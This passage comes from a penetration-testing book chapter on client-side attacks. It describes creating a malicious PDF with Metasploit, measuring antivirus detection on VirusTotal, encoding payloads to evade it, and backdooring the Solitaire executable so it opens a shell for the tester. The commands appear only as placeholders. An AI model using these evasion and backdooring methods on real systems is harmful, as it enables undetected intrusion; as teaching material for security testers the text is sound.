    to compromise a great number of companies. Within metasploit, there are a number
    of tools at our disposal that will allow us to create the PDF file. In metasploit
    enter the following commands:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE7]'
  prefs: []
  type: TYPE_PRE
- en: 'An example of the output of this command is shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Malicious PDF files](img/477-1_12_46.jpg)'
  prefs: []
  type: TYPE_IMG
- en: As the previous screenshot shows, we now have the payload disguised as a PDF.
    The screenshot also shows that we need a specific version of Adobe for the exploit
    to work. Again, we went through the process enough, and we will not repeat it
    here. The process is the same; the only difference here is that we will use a
    PDF file as the vector for attack.
  prefs: []
  type: TYPE_NORMAL
- en: Bypassing antivirus and other protection tools
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: One of the challenges we face with client-side testing is that there (more than
    likely) will be endpoint protections in place, so there is a good chance of not
    only getting caught, but also having our vector deleted by the host protections.
    As with any signature-based detection, there is a database that contains the signatures
    of the different viruses and their variants that have been discovered. When we
    look at the techniques we used throughout this chapter, we will need to see whether
    the payload we developed is going to be detected by antivirus software.
  prefs: []
  type: TYPE_NORMAL
- en: Note
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: A site that is very good at helping is [www.virustotal.com](http://www.virustotal.com).
  prefs: []
  type: TYPE_NORMAL
- en: 'We can upload our potential payload and see whether it is detected by the antivirus.
    An example of the `https.exe` file that we created earlier in this chapter is
    shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Bypassing antivirus and other protection tools](img/477-1_12_47.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'As the previous screenshot shows, 34 out of 51 antivirus products detect the
    file. That is about 67 percent and is not a very good detection rate. As we did
    previously, we will look and see whether the site we are testing has a version
    of antivirus, and then we will look to see whether the product is successful when
    looking at the file. An example of some of the products that did not detect the
    code as malicious is shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Bypassing antivirus and other protection tools](img/477-1_12_48.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'The next file we want to look at is our PDF file. An example of the detection
    ability is shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Bypassing antivirus and other protection tools](img/477-1_12_49.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Screen showing an example of the detection ability (the cropped text is not
    important)
  prefs: []
  type: TYPE_NORMAL
- en: We have an even lower detection rate for the PDF file, so we would get past
    more products with it than the binary payload.
  prefs: []
  type: TYPE_NORMAL
- en: Obfuscation and encoding
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'Since we know that our files are getting detected, we have methods to try to
    make them harder to detect, and as you can imagine with signature-based detection,
    the goal is to modify the file so that it does not match the signature. As we
    have done before, we will look at the modules that metasploit provides to try
    to modify the files'' signature. The tool we will look at is the `msfencode` in
    metasploit. We can review the usage of the tool by entering `msfencode –h`. The
    output of this command is shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Obfuscation and encoding](img/477-1_12_50.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'The next thing we want to explore is the actual encoders themselves. The tool
    not only has a number of options, but also has quite a few different encoders
    as the list in the following screenshot shows:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Obfuscation and encoding](img/477-1_12_51.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'The last technique we will use to see the detection capability against it is
    the concept of a backdoor in an executable file. What we like about this is that
    we can backdoor any legitimate executable file, and when the user runs it, they
    will send a shell to us. The program we will use for this experiment is `sol.exe`,
    which is the Solitaire program. We will use one of the encoders, but before that,
    we have to copy the original `sol.exe` file from a Windows machine and place it
    in the templates folder as shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Obfuscation and encoding](img/477-1_12_52.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'Once we have the file in the correct location, we will create the backdoor
    into the executable, and we will again use a combination of `msfpayload` with
    `msfencode`. Enter the following command:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE8]'
  prefs: []
  type: TYPE_PRE
- en: 'An example of the output from this command is shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Obfuscation and encoding](img/477-1_12_53.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'Since we have used the encoder, we now want to see what results we get when
    it is uploaded to the Virustotal site. An example of this is shown in the following
    screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Obfuscation and encoding](img/477-1_12_54.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'Our encoding has been pretty successful. We now have only 14 percent of the
    products that will detect our code, so this is much better than before. Also,
    we have done only three iterations. We could potentially improve on this, and
    it is something you may want to experiment with, but for our purpose, we will
    stop encoding here. At this point, you will set up the multi-handler, and then
    execute the program; at this time, the victim will connect to your machine. An
    example of this is shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Obfuscation and encoding](img/477-1_12_55.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Summary
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: In this chapter, we discussed client-side attacks, and this continues to be
    the method of choice as vendors improve their security. We can still use the other
    methods we discussed throughout the book; as time passes, server-side attacks
    become less effective. However, as we said throughout, you have to test for all
    possibilities, and that is why we have a systematic process to follow. We started
    the chapter with looking at the concept of lure and bait with respect to getting
    a client to come to us.
  prefs: []
  type: TYPE_NORMAL
- en: Following the discussion of lure and bait, we looked at the pilfering of data,
    that is, what we can extract from the client once we have a shell. We used a number
    of enumeration tools that are available in metasploit to accomplish this.
  prefs: []
  type: TYPE_NORMAL
- en: Following this, we looked at the powerful technique of establishing a pivot
    point from a client, and then we carried out our attack against machines that
    we cannot access without the first compromised machine.
  prefs: []
  type: TYPE_NORMAL
- en: The next area we discussed was the different types of client exploitation; we
    had `browser_autopwn`, binary payloads, and malicious PDF files.
  prefs: []
  type: TYPE_NORMAL
- en: Finally, we closed the chapter and looked at bypassing detection by antivirus
    and other signature-based detection products. We created a backdoored executable
    in the Solitaire program and gained access once the program was executed to the
    victim's machine.
  prefs: []
  type: TYPE_NORMAL
- en: This concludes the chapter. In the next chapter, we will look at creating a
    complete architecture and putting all the concepts of this book together.
  prefs: []
  type: TYPE_NORMAL
